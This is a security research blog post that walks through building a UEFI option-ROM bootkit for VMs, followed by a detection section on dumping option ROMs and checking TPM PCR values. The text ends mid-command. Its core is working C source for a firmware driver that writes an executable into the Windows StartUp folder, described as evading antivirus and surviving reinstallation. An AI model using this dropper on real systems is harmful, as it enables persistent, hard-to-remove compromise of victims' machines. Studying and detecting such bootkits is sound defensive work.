<!DOCTYPE html>
<html lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=51372&amp;path=livereload" data-no-instant defer></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>UEFI Option ROM Bootkit · x86sec</title>

  <meta name="description" content="Vulnerability research, kernel exploitation, and reverse engineering.">
  <meta name="author" content="Grant Foudree">

  
  <meta property="og:title" content="UEFI Option ROM Bootkit">
  <meta property="og:type" content="website">
  <meta property="og:url" content="http://localhost:51372/post/uefi-oprom-bootkit/">

  
  <link rel="canonical" href="http://localhost:51372/post/uefi-oprom-bootkit/">
  <link rel="alternate" type="application/rss+xml" title="x86sec" href="http://localhost:51372/index.xml">

  
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link rel="stylesheet" href="/css/main.css">

  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
</head>
<body><header class="site-header">
  <div class="container">
    <a class="site-logo" href="/" data-text="[x86sec]"><span class="bracket">[</span>x86sec<span class="bracket">]</span></a>
    <nav class="site-nav">
      
      <a href="/"
         class="active">
        posts
      </a>
      
      <a href="/about/"
         class="">
        about
      </a>
      
    </nav>
  </div>
</header>
<main>
<div class="container">

  
  <div class="page-hero">
    <h1>UEFI Option ROM Bootkit</h1>
    
    <div class="hero-meta">
      <span><span class="dot">date</span> September 26, 2022</span>
      
      <span><span class="dot">read</span> 8 min</span>
      
      <span>
        
        <a href="/tags/uefi" class="tag">uefi</a>
        
        <a href="/tags/bootkit" class="tag">bootkit</a>
        
        <a href="/tags/option-rom" class="tag">option rom</a>
        
        <a href="/tags/bios" class="tag">bios</a>
        
      </span>
      
    </div>
    
  </div>

  
  <div class="post-content">
    <article class="prose">
      <h2 id="uefi-option-rom-bootkit">UEFI Option ROM Bootkit</h2>
<h2 id="option-roms">Option ROMs</h2>
<p>Option ROMs (OpRom) are programs that get loaded by UEFI/BIOS during boot which allow a hardware vendor to execute custom code to initialize a device, install a respective driver, etc. A popular example is <a href="https://ipxe.org/">iPXE</a> which allows a NIC to PXE boot the host via an option ROM.</p>
<h2 id="adding-an-option-rom-to-vms">Adding an Option ROM to VMs</h2>
<h4 id="qemukvm">QEMU/KVM</h4>
<p>One easy way to add an OpRom to QEMU VMs is to use the e1000e NIC and pass in the OpRom as a parameter to the card</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-device e1000e,romfile<span style="color:#f92672">=</span>myoptionrom.efirom
</span></span></code></pre></div><h4 id="vmware-esxi">VMware ESXi</h4>
<p>ESXi stores VM configuration data in .vmx files where an option can be added to load a custom ROM. The iPXE project has <a href="https://ipxe.org/howto/vmware">some documentation</a> on doing this, but essentially you add a couple lines like this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ethernet0.opromsize <span style="color:#f92672">=</span> <span style="color:#ae81ff">262144</span>
</span></span><span style="display:flex;"><span>e1000bios.filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;myoptionrom.efirom&#34;</span>
</span></span></code></pre></div><h2 id="implementing-a-exe-dropper">Implementing a EXE dropper</h2>
<p>Now that we know how to load an OpRom, let&rsquo;s write one to drop an executable on a Windows system that gets launched on boot.</p>
<h4 id="uefi-driver">UEFI Driver</h4>
<p>Our OpRom driver must implement an entrypoint function (similar to main()). Here we will install our driver so the UEFI firmware can call our driver.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>EFI_DRIVER_BINDING_PROTOCOL gTestDriverBinding <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    DriverSupported,        DriverStart, DriverStop,
</span></span><span style="display:flex;"><span>    BOOTKIT_DRIVER_VERSION, NULL,        NULL};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EFI_STATUS EFIAPI <span style="color:#a6e22e">OptionRomEntrypoint</span>(IN EFI_HANDLE ImageHandle,
</span></span><span style="display:flex;"><span>                    IN EFI_SYSTEM_TABLE <span style="color:#f92672">*</span>SystemTable) {
</span></span><span style="display:flex;"><span>                        EFI_STATUS Status;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Setup global variables to use later
</span></span></span><span style="display:flex;"><span>  gBS <span style="color:#f92672">=</span> SystemTable<span style="color:#f92672">-&gt;</span>BootServices;
</span></span><span style="display:flex;"><span>  gST <span style="color:#f92672">=</span> SystemTable;
</span></span><span style="display:flex;"><span>  gImageHandle <span style="color:#f92672">=</span> ImageHandle;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">EfiLibInstallDriverBindingComponentName2</span>(
</span></span><span style="display:flex;"><span>      ImageHandle,         <span style="color:#75715e">// ImageHandle
</span></span></span><span style="display:flex;"><span>      SystemTable,         <span style="color:#75715e">// SystemTable
</span></span></span><span style="display:flex;"><span>      <span style="color:#f92672">&amp;</span>gTestDriverBinding, <span style="color:#75715e">// DriverBinding
</span></span></span><span style="display:flex;"><span>      ImageHandle,         <span style="color:#75715e">// DriverBindingHandle
</span></span></span><span style="display:flex;"><span>      NULL, NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ASSERT_EFI_ERROR</span>(Status);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> Status;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Next, a couple more functions. DriverSupported() is called for each device the UEFI firmware enumerates and inside, we declare if our driver supports it. We will implement this to only support the e1000e NIC.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>EFI_STATUS EFIAPI <span style="color:#a6e22e">DriverStop</span>(IN EFI_DRIVER_BINDING_PROTOCOL <span style="color:#f92672">*</span>This,
</span></span><span style="display:flex;"><span>           IN EFI_HANDLE Controller, IN UINTN NumberOfChildren, 
</span></span><span style="display:flex;"><span>           IN EFI_HANDLE <span style="color:#f92672">*</span>ChildHandleBuffer) {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Don&#39;t need to anything here
</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> EFI_SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EFI_STATUS EFIAPI <span style="color:#a6e22e">DriverSupported</span>(IN EFI_DRIVER_BINDING_PROTOCOL <span style="color:#f92672">*</span>This, 
</span></span><span style="display:flex;"><span>                IN EFI_HANDLE Controller,
</span></span><span style="display:flex;"><span>                IN EFI_DEVICE_PATH_PROTOCOL <span style="color:#f92672">*</span>RemainingDevicePath) {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Get EFI_DEVICE protocols
</span></span></span><span style="display:flex;"><span>  EFI_DEVICE_PATH_PROTOCOL <span style="color:#f92672">*</span>this <span style="color:#f92672">=</span> <span style="color:#a6e22e">DevicePathFromHandle</span>(Controller);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (this <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> EFI_UNSUPPORTED;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef OPROM_DEBUG
</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Print debug info with a UEFI string describing the device
</span></span></span><span style="display:flex;"><span>  CHAR16 <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> <span style="color:#a6e22e">ConvertDevicePathToText</span>(this, TRUE, FALSE);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, p);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Only want our driver to work for the e1000e NIC
</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Checke1000eNIC</span>(Controller, <span style="color:#f92672">&amp;</span>This)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> EFI_SUCCESS;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> EFI_UNSUPPORTED;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>To check if we are being invoked for the e1000e NIC, we will do a PCI read of the header on the device and check the vendor/device IDs to see if they match.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOLEAN <span style="color:#a6e22e">Checke1000eNIC</span>(EFI_HANDLE Controller,
</span></span><span style="display:flex;"><span>                       EFI_DRIVER_BINDING_PROTOCOL <span style="color:#f92672">**</span>This) {
</span></span><span style="display:flex;"><span>  EFI_STATUS Status <span style="color:#f92672">=</span> EFI_SUCCESS;
</span></span><span style="display:flex;"><span>  EFI_PCI_IO_PROTOCOL <span style="color:#f92672">*</span>PciIo;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Open the PCIIo protocol on this PCI device handle
</span></span></span><span style="display:flex;"><span>  PCI_TYPE00 Pci;
</span></span><span style="display:flex;"><span>  Status <span style="color:#f92672">=</span> gBS<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">OpenProtocol</span>(Controller, <span style="color:#f92672">&amp;</span>gEfiPciIoProtocolGuid,
</span></span><span style="display:flex;"><span>                             (VOID <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>PciIo, (<span style="color:#f92672">*</span>This)<span style="color:#f92672">-&gt;</span>DriverBindingHandle,
</span></span><span style="display:flex;"><span>                             Controller, EFI_OPEN_PROTOCOL_BY_DRIVER);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EFI_ERROR</span>(Status) <span style="color:#f92672">||</span> PciIo <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  Status <span style="color:#f92672">=</span> PciIo<span style="color:#f92672">-&gt;</span>Pci.<span style="color:#a6e22e">Read</span>(PciIo,                       <span style="color:#75715e">// (protocol, device)
</span></span></span><span style="display:flex;"><span>                                                        <span style="color:#75715e">// handle
</span></span></span><span style="display:flex;"><span>                           EfiPciIoWidthUint32,         <span style="color:#75715e">// access width &amp; copy
</span></span></span><span style="display:flex;"><span>                                                        <span style="color:#75715e">// mode
</span></span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0</span>,                           <span style="color:#75715e">// Offset
</span></span></span><span style="display:flex;"><span>                           <span style="color:#66d9ef">sizeof</span> Pci <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(UINT32), <span style="color:#75715e">// Count
</span></span></span><span style="display:flex;"><span>                           <span style="color:#f92672">&amp;</span>Pci                         <span style="color:#75715e">// target buffer
</span></span></span><span style="display:flex;"><span>  );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  gBS<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">CloseProtocol</span>(Controller, <span style="color:#f92672">&amp;</span>gEfiPciIoProtocolGuid,
</span></span><span style="display:flex;"><span>                     (<span style="color:#f92672">*</span>This)<span style="color:#f92672">-&gt;</span>DriverBindingHandle, Controller);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (Status <span style="color:#f92672">==</span> EFI_SUCCESS) {
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef OPROM_DEBUG
</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;PCI %X %X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Pci.Hdr.VendorId, Pci.Hdr.DeviceId);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// e1000e Vendor &amp; Device ID
</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (Pci.Hdr.VendorId <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8086</span> <span style="color:#f92672">&amp;&amp;</span> Pci.Hdr.DeviceId <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x10d3</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Finally, we will implement the DriverStart function which will be invoked once for the e1000e NIC once the device is discovered. Here we will dump &ldquo;calc.exe&rdquo; into the startup folder of the Windows install for a PoC.</p>
<p>To dump the file, we will rely on a NTFS driver to access the disk. UEFI has support built in to access FAT file systems so we need to load an <a href="https://github.com/gfoudree/UEFIBootkit/blob/main/ntfs_x64_rw.efi">NTFS driver</a> which will allow the UEFI file APIs to work with NTFS.</p>
<p>First we try and open the EFISimpleFileSystemProtocol on all the devices (which should be present on a disk device). Next, we open the volume and a file inside the Windows startup folder and finally write our executable data to it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>EFI_STATUS EFIAPI <span style="color:#a6e22e">DriverStart</span>(IN EFI_DRIVER_BINDING_PROTOCOL <span style="color:#f92672">*</span>This, 
</span></span><span style="display:flex;"><span>            IN EFI_HANDLE Controller,
</span></span><span style="display:flex;"><span>            IN EFI_DEVICE_PATH_PROTOCOL <span style="color:#f92672">*</span>RemainingDevicePath) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DumpCalcExe</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> EFI_SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VOID <span style="color:#a6e22e">DumpCalcExe</span>() {
</span></span><span style="display:flex;"><span>  EFI_STATUS Status <span style="color:#f92672">=</span> EFI_SUCCESS;
</span></span><span style="display:flex;"><span>  UINTN i;
</span></span><span style="display:flex;"><span>  EFI_HANDLE <span style="color:#f92672">*</span>HandleBuffer <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  UINTN HandleCount;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Get the SimpleFileSystem handles avail
</span></span></span><span style="display:flex;"><span>  Status <span style="color:#f92672">=</span> gBS<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">LocateHandleBuffer</span>(ByProtocol, <span style="color:#f92672">&amp;</span>gEfiSimpleFileSystemProtocolGuid,
</span></span><span style="display:flex;"><span>                              NULL, <span style="color:#f92672">&amp;</span>HandleCount, <span style="color:#f92672">&amp;</span>HandleBuffer);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EFI_ERROR</span>(Status)) {
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef OPROM_DEBUG
</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Status %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> HandleCount %llx&#34;</span>, Status, HandleCount);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Loop over all the disks
</span></span></span><span style="display:flex;"><span>    EFI_FILE_PROTOCOL <span style="color:#f92672">*</span>Fs <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> HandleCount; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>      EFI_SIMPLE_FILE_SYSTEM_PROTOCOL <span style="color:#f92672">*</span>SimpleFs <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>      EFI_FILE_PROTOCOL <span style="color:#f92672">*</span>File <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Get protocol pointer for current volume
</span></span></span><span style="display:flex;"><span>      Status <span style="color:#f92672">=</span> gBS<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">HandleProtocol</span>(HandleBuffer[i],
</span></span><span style="display:flex;"><span>                                   <span style="color:#f92672">&amp;</span>gEfiSimpleFileSystemProtocolGuid,
</span></span><span style="display:flex;"><span>                                   (VOID <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>SimpleFs);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EFI_ERROR</span>(Status)) {
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef OPROM_DEBUG
</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;FindWritableFs: gBS-&gt;HandleProtocol[%d] returned %r</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i,
</span></span><span style="display:flex;"><span>              Status);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Open the volume
</span></span></span><span style="display:flex;"><span>      Status <span style="color:#f92672">=</span> SimpleFs<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">OpenVolume</span>(SimpleFs, <span style="color:#f92672">&amp;</span>Fs);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EFI_ERROR</span>(Status)) {
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef OPROM_DEBUG
</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;FindWritableFs: SimpleFs-&gt;OpenVolume[%d] returned %r</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i,
</span></span><span style="display:flex;"><span>              Status);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Try opening calc.exe file for writing
</span></span></span><span style="display:flex;"><span>      Status <span style="color:#f92672">=</span> Fs<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Open</span>(
</span></span><span style="display:flex;"><span>          Fs, <span style="color:#f92672">&amp;</span>File,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ProgramData</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Microsoft</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Start &#34;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Menu</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Programs</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">StartUp</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">calc.exe&#34;</span>,
</span></span><span style="display:flex;"><span>          EFI_FILE_MODE_CREATE <span style="color:#f92672">|</span> EFI_FILE_MODE_READ <span style="color:#f92672">|</span> EFI_FILE_MODE_WRITE, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EFI_ERROR</span>(Status)) {
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef OPROM_DEBUG
</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;FindWritableFs: Fs-&gt;Open[%d] returned %r</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i, Status);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      UINTN bufSz <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(calc_exe);
</span></span><span style="display:flex;"><span>      Status <span style="color:#f92672">=</span> File<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Write</span>(File, <span style="color:#f92672">&amp;</span>bufSz, calc_exe);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EFI_ERROR</span>(Status)) {
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef OPROM_DEBUG
</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Print</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Error with file-&gt;write %r</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Status);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      File<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Close</span>(File);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      Status <span style="color:#f92672">=</span> EFI_SUCCESS;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="impact">Impact</h2>
<p>Since the bootkit hides inside of an option ROM of a PCI device, AV is not going to detect it let alone remove it. It will persist across reboots of the host as well as reinstallation, making for a great stealth persistance option. While this is a rather simplistic bootkit, much more can be done to  create a much more stealthy/persistant bootkit such as inserting SMM handlers from the UEFI firmware, etc.</p>
<p>Furthermore, rarely are .vmx files or KVM configurations audited for this sort of thing making it quite stealthy.</p>
<h2 id="detection--prevention">Detection &amp; Prevention</h2>
<h4 id="dumping-pcie-oproms">Dumping PCIe OpRoms</h4>
<p>On Linux, you can enumerate PCI devices with the <code>lspci</code> command and get detailed information about each device, including if there is an OpRom attached. Below, you can see our <code>e1000e</code> device and it has an &ldquo;Expansion ROM&rdquo; of 256k.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ lspci -vv
</span></span><span style="display:flex;"><span>00:04.0 Ethernet controller: Intel Corporation 82574L Gigabit Network Connection
</span></span><span style="display:flex;"><span>        Subsystem: Intel Corporation 82574L Gigabit Network Connection
</span></span><span style="display:flex;"><span>        Physical Slot: <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>        Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx+
</span></span><span style="display:flex;"><span>        Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL<span style="color:#f92672">=</span>fast &gt;TAbort- &lt;TAbort- &lt;MAbort- &gt;SERR- &lt;PERR- INTx-
</span></span><span style="display:flex;"><span>        Latency: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        Interrupt: pin A routed to IRQ <span style="color:#ae81ff">11</span>
</span></span><span style="display:flex;"><span>        Region 0: Memory at <span style="color:#ae81ff">81060000</span> <span style="color:#f92672">(</span>32-bit, non-prefetchable<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>size<span style="color:#f92672">=</span>128K<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        Region 1: Memory at <span style="color:#ae81ff">81040000</span> <span style="color:#f92672">(</span>32-bit, non-prefetchable<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>size<span style="color:#f92672">=</span>128K<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        Region 2: I/O ports at c040 <span style="color:#f92672">[</span>size<span style="color:#f92672">=</span>32<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        Region 3: Memory at 810a0000 <span style="color:#f92672">(</span>32-bit, non-prefetchable<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>size<span style="color:#f92672">=</span>16K<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        Expansion ROM at <span style="color:#ae81ff">40040000</span> <span style="color:#f92672">[</span>disabled<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>size<span style="color:#f92672">=</span>256K<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        Capabilities: &lt;access denied&gt;
</span></span><span style="display:flex;"><span>        Kernel driver in use: e1000e
</span></span><span style="display:flex;"><span>        Kernel modules: e1000e
</span></span></code></pre></div><p>We can then extract the OpRom by enabling the read and copying it out to a file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /sys/devices/pci0000:00/0000:00:04.0
</span></span><span style="display:flex;"><span>echo <span style="color:#ae81ff">1</span> | sudo tee rom
</span></span><span style="display:flex;"><span>sudo dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>rom of<span style="color:#f92672">=</span>/tmp/oprom.bin bs<span style="color:#f92672">=</span>1k count<span style="color:#f92672">=</span><span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#ae81ff">0</span> | sudo tee rom
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ file /tmp/oprom.bin 
</span></span><span style="display:flex;"><span>/tmp/oprom.bin: BIOS <span style="color:#f92672">(</span>ia32<span style="color:#f92672">)</span> ROM Ext. <span style="color:#f92672">(</span>80*512<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>└─$ md5sum /tmp/oprom.bin 
</span></span><span style="display:flex;"><span>8f50555af37068823a7a404683b99585  /tmp/oprom.bin
</span></span></code></pre></div><p>And bingo, the hash matches the OpRom we are passing in to QEMU for the <code>e1000e</code> NIC.</p>
<p>From here, one can reverse engineer the ROM or simply alert that a new ROM has been introduced.</p>
<h4 id="tpm-pcr-registers">TPM PCR Registers</h4>
<p>As part of the secure boot platform, the TPM contains <a href="https://wiki.archlinux.org/title/Trusted_Platform_Module#Accessing_PCR_registers">PCR registers</a> which have hash values representative of the current system state including firmware. Modifying the underlying firmware will make these hash values change (and therefore possibly fail secure boot) so we can detect the insertion/modification of an OpRom via these hash values.</p>
<p><img src="/tpm_pcr_registers.webp" alt="TPM PCR registers"></p>
<p>We can test this with QEMU by creating a vTPM for the VM (be sure OVMF is built with <code>-D TPM2_ENABLE -D SECURE_BOOT_ENABLE</code>)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>swtpm socket --tpmstate dir<span style="color:#f92672">=</span>/tmp/emulated_tpm --ctrl <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>        type<span style="color:#f92672">=</span>unixio,path<span style="color:#f92672">=</span>/tmp/emulated_tpm/swtpm-sock <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>        --log level<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span> --tpm2
</span></span><span style="display:flex;"><span>
